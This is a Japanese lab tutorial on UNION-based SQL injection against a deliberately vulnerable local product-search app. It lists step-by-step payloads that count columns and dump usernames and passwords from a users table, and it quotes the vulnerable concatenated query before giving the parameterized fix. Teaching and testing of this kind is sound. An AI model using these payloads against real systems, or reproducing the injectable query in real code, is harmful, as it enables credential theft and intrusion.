# PoC②: UNIONベースのSQLインジェクション

商品検索フォームから、別テーブル（`users`）の内容を検索結果に混ぜて抜き出す。

```bash
pip install -r requirements.txt
python app.py
# http://127.0.0.1:5002
```

## Step 1: 脆弱なコードを読む

`app.py` の該当部分：

```python
query = "SELECT id, name, price FROM products WHERE name LIKE '%" + q + "%'"
```

`products` は3カラム（`id, name, price`）を `SELECT` している。この「3」という数字が
攻撃時にどう使われるか、以下を進めながら確認しよう。

## Step 2: 攻撃してみる

### 2-1. カラム数を確認する（`ORDER BY` を使う方法）

```
q = a%' ORDER BY 4 --
```

→ `products` は3カラムしかないので `ORDER BY 4` はエラーになる。
`ORDER BY 3` まで下げるとエラーが消える → **カラム数は3**と分かる。

### 2-2. UNION SELECT でカラム数を合わせて実行する

```
q = a%' UNION SELECT 1,2,3 --
```

エラーが出ずに `1, 2, 3` の行が表示されればカラム数・型が一致している。

### 2-3. 本命：`users` テーブルの中身を抜き出す

```
q = zzz%' UNION SELECT id, username, password FROM users --
```

（`zzz` は本来の商品名にマッチしないダミー文字列。これで元の検索結果を空にして、
UNIONした結果だけを見やすくしている）

→ 検索結果の一覧に `admin` / `S3cretAdminPass!` などが**商品名・価格の欄に紛れて表示される**

## Step 3: 自分で修正する

`app.py` の文字列結合部分を、プレースホルダを使う形に書き換えてみよう。
ワイルドカード（`%`）はアプリ側の文字列として組み立てて、SQL文自体は変えないのがポイント。

```python
# 書き換え後のイメージ
query = "SELECT id, name, price FROM products WHERE name LIKE ?"
like_pattern = "%" + q + "%"
cur.execute(query, (like_pattern,))
```

## Step 4: 再攻撃して防御を確認する

Step 2-3 と同じペイロードを試して、`UNION SELECT` が構文として解釈されず
**ヒット件数が0件になる**ことを確認しよう。

## 答え合わせ

```bash
python secure_app.py
# http://127.0.0.1:5012
```

## 🎯 理解してほしいこと

- 検索（`LIKE`）のように**値の一部を組み立てる処理**でも、文字列結合なら同じく危険
- `UNION SELECT` は「列数と型を合わせれば別テーブルの内容を差し込める」という仕組み
- プレースホルダに渡す値は `%keyword%` のように**組み立てた後の文字列でもよい**
  → 大事なのは「SQL文の構造そのもの」を入力で変えられないようにすること
